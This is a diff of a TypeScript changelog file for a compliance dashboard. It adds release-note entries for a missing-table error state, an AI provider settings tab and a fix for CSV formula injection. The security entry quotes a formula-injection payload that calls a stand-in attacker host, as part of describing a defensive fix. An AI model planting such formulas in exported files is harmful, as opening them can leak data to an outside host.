@@ -1475,8 +1475,16 @@ export const RELEASES: Release[] = [
 ]
 
 export const UNRELEASED: UnreleasedChanges = {
-  "entryCount": 54,
+  "entryCount": 56,
   "entries": [
+    {
+      "type": "fix",
+      "scope": "ux",
+      "summary": "**a missing database table now renders as a calm \"not set up yet\" state, never a raw PostgREST error.** A screen whose backing table has not been provisioned in an environment showed the operator `Could not find the table 'public.vendor_assessments' in the schema cache` — a precise message for an engineer, a crash for a CISO. New `dashboard/src/lib/supabaseError.ts` recognises the PostgREST schema-cache error (`PGRST205`) and the raw Postgres `42P01`, and `ErrorState` now renders those as a neutral, reassuring setup state (wrench icon, \"this module is not set up yet — a pending migration hasn't been applied; nothing is broken and no data has been lost\") with no retry-into-a-wall button, instead of the red alarm with the raw string. Real faults are unchanged. Applied automatically everywhere `ErrorState` is used, so the whole vendor/TPRM and supply-chain cluster degrades gracefully while its backend catches up. 7 new tests pinning that the raw \"schema cache\" phrasing never reaches the screen.",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
     {
       "type": "feat",
       "scope": "ui",
@@ -1489,6 +1497,14 @@ export const UNRELEASED: UnreleasedChanges = {
       "type": "fix",
       "scope": "security",
       "summary": "**close CSV formula injection (CWE-1236) in data exports.** New `dashboard/src/lib/csv.ts` (`toCsv`/`downloadCsv`) prefixes any cell beginning with `= + - @`/tab/CR with `'`, so a spreadsheet renders `=WEBSERVICE(\"http://attacker\")` as text instead of executing it when an auditor opens the file — and quotes every field per RFC 4180, which the hand-rolled exporters did not (a comma in a category broke the row; a `JSON.stringify`'d name still executed). Many exported fields are attacker-influenceable (a vendor name, an owner, a resource tag synced from a connected integration), so this is a real exposure in an export-heavy GRC product, not a theoretical one. `ModelRegistry` and `VendorRegistry` migrated onto the safe util; the remaining ~22 hand-rolled exporters are tracked as **TD-021** with the full list, being migrated incrementally rather than in one unreviewed overnight sweep that could silently regress audit-export columns. 14 new tests (CSV injection/quoting, faceted-filter derivation).",
+      "breaking": false,
+      "sha": null,
+      "section": null
+    },
+    {
+      "type": "feat",
+      "scope": "settings",
+      "summary": "**AI Brain configuration tab.** New Settings > AI Brain tab lets administrators connect an AI provider (OpenAI, Anthropic, Google AI, Azure OpenAI), supply an API key (AES-256-GCM encrypted server-side via the `ai-brain-config` Edge Function), choose judge and embedding models, set the auto-action confidence threshold, and enable/disable the AI Brain engine. The tab explains what AI Brain activates: automated compliance evaluation, semantic search, auto-triage, trust-engine scoring, and intelligent evidence mapping. Key prefix (first 8 chars) is the only credential state returned to the browser. Backend: `ai_brain_config` table with RLS, Edge Function with JWT auth + org resolution. Module doc: `docs/modules/ai-brain-config.md`.",
       "breaking": false,
       "sha": null,
       "section": null
